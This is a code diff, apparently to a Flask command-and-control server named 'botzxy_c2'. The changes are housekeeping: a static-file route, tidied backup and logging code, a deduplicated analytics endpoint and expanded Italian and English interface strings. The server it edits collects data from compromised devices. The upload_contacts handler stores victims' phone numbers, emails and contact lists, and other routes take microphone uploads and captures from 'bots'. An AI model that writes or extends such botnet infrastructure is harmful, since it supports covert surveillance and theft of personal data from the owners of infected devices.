@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template
+from flask import Flask, request, jsonify, render_template, send_from_directory
 from flask_socketio import SocketIO
 from flask_cors import CORS
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
@@ -32,6 +32,11 @@ login_manager.init_app(app)
 login_manager.login_view = 'login'
 
 DB_PATH = 'database/botzxy_c2.db'
+
+# ============ SERVIRE FILE STATICI ============
+@app.route('/static/<path:filename>')
+def serve_static(filename):
+    return send_from_directory('static', filename)
 
 # ============ RIPRISTINA LOG ALL'AVVIO ============
 restore_logs()
@@ -88,20 +93,16 @@ def log_action(device_id, action, details):
         conn.execute('INSERT INTO logs (device_id, action, details) VALUES (?, ?, ?)', (device_id, action, details))
         conn.commit()
         conn.close()
-        # Backup automatico
         backup_logs()
     except:
         pass
 
-# ============ BACKUP AUTOMATICO (INDENTAZIONE CORRETTA) ============
+# ============ BACKUP AUTOMATICO ============
 def scheduled_backup():
-    """Esegue il backup dei log ogni 5 minuti"""
     while True:
-        time.sleep(300)  # 5 minuti
+        time.sleep(300)
         backup_logs()
-        print(f"[+] Backup automatico eseguito alle {datetime.now().strftime('%H:%M:%S')}")
 
-# Avvia il thread di backup
 backup_thread = threading.Thread(target=scheduled_backup, daemon=True)
 backup_thread.start()
 print("[+] Thread di backup avviato")
@@ -385,7 +386,8 @@ def upload_mic(device_id):
 def upload_contacts(device_id):
     data = request.json
     conn = get_db()
-    conn.execute('UPDATE devices SET phone_number = ?, email = ?, contacts = ? WHERE device_id = ?', (data.get('phone_number'), data.get('email'), json.dumps(data.get('contacts', [])), device_id))
+    conn.execute('UPDATE devices SET phone_number = ?, email = ?, contacts = ? WHERE device_id = ?', 
+                (data.get('phone_number'), data.get('email'), json.dumps(data.get('contacts', [])), device_id))
     conn.commit()
     conn.close()
     log_action(device_id, 'contacts_extracted', 'Contatti estratti')
@@ -520,23 +522,7 @@ def get_activity_7d():
 @app.route('/api/analytics/top_devices', methods=['GET'])
 @login_required
 def get_top_devices():
-    conn = get_db()
-    data = conn.execute('''
-        SELECT device_id, hostname, platform, 
-               COUNT(commands.id) as commands_count,
-               (SELECT COUNT(*) FROM captures WHERE captures.device_id = devices.device_id) as captures_count
-        FROM devices
-        LEFT JOIN commands ON commands.device_id = devices.device_id
-        GROUP BY devices.device_id
-        ORDER BY commands_count DESC
-        LIMIT 10
-    ''').fetchall()
-    conn.close()
-    return jsonify([dict(d) for d in data])
-
-@app.route('/api/analytics/top_devices', methods=['GET'])
-@login_required
-def get_top_devices():
+    """Dispositivi più attivi"""
     try:
         conn = get_db()
         data = conn.execute('''
@@ -660,120 +646,67 @@ def save_settings():
     log_action('system', 'settings_updated', f'Impostazioni aggiornate: theme={theme}, language={language}')
     return jsonify({'status': 'saved'})
 
+# ============ TRADUZIONI ============
 @app.route('/api/translations', methods=['GET'])
 @login_required
 def get_translations():
     lang = request.args.get('lang', 'it')
     translations = {
         'it': {
-            'dashboard': 'Dashboard',
-            'devices': 'Dispositivi',
-            'captures': 'Catture',
-            'analytics': 'Analytics',
-            'logs': 'Log',
-            'settings': 'Impostazioni',
-            'logout': 'Esci',
-            'total_devices': 'Dispositivi totali',
-            'online_bots': 'Bot online',
-            'captures_count': 'Catture',
-            'commands': 'Comandi',
-            'system_active': 'Sistema attivo',
-            'refresh': 'Aggiorna',
-            'export': 'Esporta',
-            'delete': 'Elimina',
-            'save': 'Salva',
-            'cancel': 'Annulla',
-            'search': 'Cerca...',
-            'no_data': 'Nessun dato disponibile',
-            'loading': 'Caricamento...',
-            'error': 'Errore',
-            'success': 'Successo',
-            'online': 'Online',
-            'offline': 'Offline',
-            'actions': 'Azioni',
-            'platform': 'Piattaforma',
-            'hostname': 'Nome host',
-            'ip': 'Indirizzo IP',
-            'status': 'Stato',
-            'last_seen': 'Ultimo visto',
-            'phone': 'Telefono',
-            'id': 'ID',
-            'device_id': 'ID dispositivo',
-            'type': 'Tipo',
-            'created_at': 'Creato il',
-            'details': 'Dettagli',
-            'timestamp': 'Data/ora',
-            'device': 'Dispositivo',
-            'action': 'Azione',
-            'no_captures': 'Nessuna cattura trovata',
-            'no_devices': 'Nessun dispositivo connesso',
-            'no_logs': 'Nessun log disponibile',
-            'theme': 'Tema',
-            'language': 'Lingua',
-            'notifications': 'Notifiche',
-            'security': 'Sicurezza',
-            'change_password': 'Cambia password',
-            'logout_all': 'Disconnetti tutti i dispositivi',
-            'save_settings': 'Salva impostazioni',
-            'settings_saved': 'Impostazioni salvate!',
-            'settings_error': 'Errore salvataggio',
-            'password_changed': 'Password cambiata con successo!',
-            'password_error': 'Password attuale errata'
+            'dashboard': 'Dashboard', 'devices': 'Dispositivi', 'captures': 'Catture',
+            'analytics': 'Analytics', 'logs': 'Log', 'settings': 'Impostazioni',
+            'logout': 'Esci', 'total_devices': 'Dispositivi totali', 'online_bots': 'Bot online',
+            'commands': 'Comandi', 'system_active': 'Sistema attivo', 'refresh': 'Aggiorna',
+            'export': 'Esporta', 'delete': 'Elimina', 'save': 'Salva', 'cancel': 'Annulla',
+            'search': 'Cerca...', 'no_data': 'Nessun dato disponibile', 'loading': 'Caricamento...',
+            'error': 'Errore', 'success': 'Successo', 'online': 'Online', 'offline': 'Offline',
+            'actions': 'Azioni', 'platform': 'Piattaforma', 'hostname': 'Nome host',
+            'ip': 'Indirizzo IP', 'status': 'Stato', 'last_seen': 'Ultimo visto',
+            'phone': 'Telefono', 'id': 'ID', 'type': 'Tipo', 'created_at': 'Creato il',
+            'details': 'Dettagli', 'timestamp': 'Data/ora', 'device': 'Dispositivo',
+            'action': 'Azione', 'no_devices': 'Nessun dispositivo connesso',
+            'no_captures': 'Nessuna cattura trovata', 'no_logs': 'Nessun log disponibile',
+            'theme': 'Tema', 'language': 'Lingua', 'notifications': 'Notifiche',
+            'security': 'Sicurezza', 'change_password': 'Cambia password',
+            'logout_all': 'Disconnetti tutti i dispositivi', 'save_settings': 'Salva impostazioni',
+            'settings_saved': 'Impostazioni salvate!', 'settings_error': 'Errore salvataggio',
+            'password_changed': 'Password cambiata con successo!', 'password_error': 'Password attuale errata',
+            'capture_types': 'Tipi di cattura', 'top_devices': 'Dispositivi più attivi',
+            'activity_7d': 'Attività dispositivi (7 giorni)', 'platforms': 'Piattaforme',
+            'stats': 'Statistiche reali', 'active_bots': 'Bot attivi (oggi)',
+            'username': 'Username', 'password': 'Password', 'login_btn': 'ACCEDI AL DASHBOARD',
+            'dark': 'Scuro', 'light': 'Chiaro', 'blue': 'Blu', 'green': 'Verde',
+            'purple': 'Viola', 'orange': 'Arancione', 'cyber': 'Cyber', 'matrix': 'Matrix',
+            'lang_it': 'Italiano', 'lang_en': 'English', 'lang_fr': 'Français',
+            'lang_es': 'Español', 'lang_de': 'Deutsch'
         },
         'en': {
-            'dashboard': 'Dashboard',
-            'devices': 'Devices',
-            'captures': 'Captures',
-            'analytics': 'Analytics',
-            'logs': 'Logs',
-            'settings': 'Settings',
-            'logout': 'Logout',
-            'total_devices': 'Total Devices',
-            'online_bots': 'Online Bots',
-            'captures_count': 'Captures',
-            'commands': 'Commands',
-            'system_active': 'System Active',
-            'refresh': 'Refresh',
-            'export': 'Export',
-            'delete': 'Delete',
-            'save': 'Save',
-            'cancel': 'Cancel',
-            'search': 'Search...',
-            'no_data': 'No data available',
-            'loading': 'Loading...',
-            'error': 'Error',
-            'success': 'Success',
-            'online': 'Online',
-            'offline': 'Offline',
-            'actions': 'Actions',
-            'platform': 'Platform',
-            'hostname': 'Hostname',
-            'ip': 'IP Address',
-            'status': 'Status',
-            'last_seen': 'Last Seen',
-            'phone': 'Phone',
-            'id': 'ID',
-            'device_id': 'Device ID',
-            'type': 'Type',
-            'created_at': 'Created At',
-            'details': 'Details',
-            'timestamp': 'Date/Time',
-            'device': 'Device',
-            'action': 'Action',
-            'no_captures': 'No captures found',
-            'no_devices': 'No devices connected',
-            'no_logs': 'No logs available',
-            'theme': 'Theme',
-            'language': 'Language',
-            'notifications': 'Notifications',
-            'security': 'Security',
-            'change_password': 'Change Password',
-            'logout_all': 'Logout all devices',
-            'save_settings': 'Save Settings',
-            'settings_saved': 'Settings saved!',
-            'settings_error': 'Error saving',
-            'password_changed': 'Password changed successfully!',
-            'password_error': 'Current password is incorrect'
+            'dashboard': 'Dashboard', 'devices': 'Devices', 'captures': 'Captures',
+            'analytics': 'Analytics', 'logs': 'Logs', 'settings': 'Settings',
+            'logout': 'Logout', 'total_devices': 'Total Devices', 'online_bots': 'Online Bots',
+            'commands': 'Commands', 'system_active': 'System Active', 'refresh': 'Refresh',
+            'export': 'Export', 'delete': 'Delete', 'save': 'Save', 'cancel': 'Cancel',
+            'search': 'Search...', 'no_data': 'No data available', 'loading': 'Loading...',
+            'error': 'Error', 'success': 'Success', 'online': 'Online', 'offline': 'Offline',
+            'actions': 'Actions', 'platform': 'Platform', 'hostname': 'Hostname',
+            'ip': 'IP Address', 'status': 'Status', 'last_seen': 'Last Seen',
+            'phone': 'Phone', 'id': 'ID', 'type': 'Type', 'created_at': 'Created At',
+            'details': 'Details', 'timestamp': 'Date/Time', 'device': 'Device',
+            'action': 'Action', 'no_devices': 'No devices connected',
+            'no_captures': 'No captures found', 'no_logs': 'No logs available',
+            'theme': 'Theme', 'language': 'Language', 'notifications': 'Notifications',
+            'security': 'Security', 'change_password': 'Change Password',
+            'logout_all': 'Logout all devices', 'save_settings': 'Save Settings',
+            'settings_saved': 'Settings saved!', 'settings_error': 'Error saving',
+            'password_changed': 'Password changed successfully!', 'password_error': 'Current password is incorrect',
+            'capture_types': 'Capture types', 'top_devices': 'Top devices',
+            'activity_7d': 'Device activity (7 days)', 'platforms': 'Platforms',
+            'stats': 'Real statistics', 'active_bots': 'Active bots (today)',
+            'username': 'Username', 'password': 'Password', 'login_btn': 'ACCESS DASHBOARD',
+            'dark': 'Dark', 'light': 'Light', 'blue': 'Blue', 'green': 'Green',
+            'purple': 'Purple', 'orange': 'Orange', 'cyber': 'Cyber', 'matrix': 'Matrix',
+            'lang_it': 'Italian', 'lang_en': 'English', 'lang_fr': 'French',
+            'lang_es': 'Spanish', 'lang_de': 'German'
         }
     }
     return jsonify(translations.get(lang, translations['it']))
